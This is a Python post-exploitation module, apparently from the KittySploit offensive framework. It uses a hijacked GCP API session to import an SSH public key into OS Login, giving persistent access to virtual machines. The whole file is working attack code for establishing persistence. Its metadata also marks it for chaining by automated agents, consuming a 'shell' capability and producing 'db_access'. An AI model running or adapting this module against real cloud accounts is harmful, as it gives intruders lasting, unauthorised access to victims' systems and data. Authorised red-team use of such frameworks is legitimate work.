#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
import time

from kittysploit import *
from lib.post.gcp import GcpPostMixin


class Module(Post, GcpPostMixin):
    __info__ = {
        "name": "GCP OS Login Import SSH Key",
        "description": "Import an SSH public key into OS Login for persistent VM access",
        "author": "KittySploit Team",
        "session_type": SessionType.GCP_API,
        "tags": ["gcp", "cloud", "oslogin", "ssh", "persistence"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['configuration_change', 'api_request'],
        'expected_requests': 1,
        'reversible': True,
        'approval_required': True,
        'produces': ['risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    user_email = OptString("", "OS Login user email; defaults to current client_email domain user when empty", False)
    ssh_public_key = OptString("", "SSH public key to import (single line)", True)
    key_type = OptString("ssh-rsa", "Key type label stored by OS Login", False)
    expiration_hours = OptInteger(0, "Key expiration in hours; 0 uses platform default/no explicit expiry", False)
    export_json = OptString("", "Optional output JSON file", False)

    def run(self):
        try:
            project_id = self._gcp_project_id()
            if not project_id:
                print_error("Could not resolve project_id from session")
                return False

            public_key = str(self.ssh_public_key or "").strip()
            if not public_key:
                print_error("ssh_public_key is required")
                return False

            user_email = self._resolve_user_email()
            if not user_email:
                print_error("Could not resolve OS Login user email")
                return False

            expiration_usec = self._expiration_usec()
            print_info(f"Importing SSH public key for OS Login user {user_email}...")
            result = self._gcp_import_oslogin_ssh_key(
                user_email,
                public_key,
                key_type=str(self.key_type or "ssh-rsa"),
                expiration_usec=expiration_usec,
            )
            body = result.get("body")

            if not result.get("ok"):
                print_error(f"OS Login import failed: {(result.get('error') or '')[:500]}")
                return False

            print_success("SSH public key imported through OS Login")
            if isinstance(body, dict):
                login_profile = body.get("loginProfile") or body
                print_info(json.dumps(login_profile, indent=2)[:4000])

            output = {
                "project_id": project_id,
                "user_email": user_email,
                "response": body,
            }
            if self.export_json:
                exported = self._gcp_export_json(str(self.export_json or ""), output)
                if exported:
                    print_success(f"Results exported to {exported}")

            return self.module_result(success=True, data=output)
        except Exception as exc:
            print_error(f"OS Login SSH key import failed: {exc}")
            return False

    def _resolve_user_email(self):
        configured = str(self.user_email or "").strip()
        if configured:
            return configured

        client_email = self._gcp_client_email()
        if not client_email:
            return ""

        if client_email.endswith(".gserviceaccount.com"):
            print_warning(
                "Current principal is a service account; set user_email to the OS Login "
                "Google identity (e.g. user@company.com)"
            )
            return ""

        return client_email

    def _expiration_usec(self):
        hours = int(self.expiration_hours or 0)
        if hours <= 0:
            return None
        expire_at = time.time() + (hours * 3600)
        return str(int(expire_at * 1_000_000))
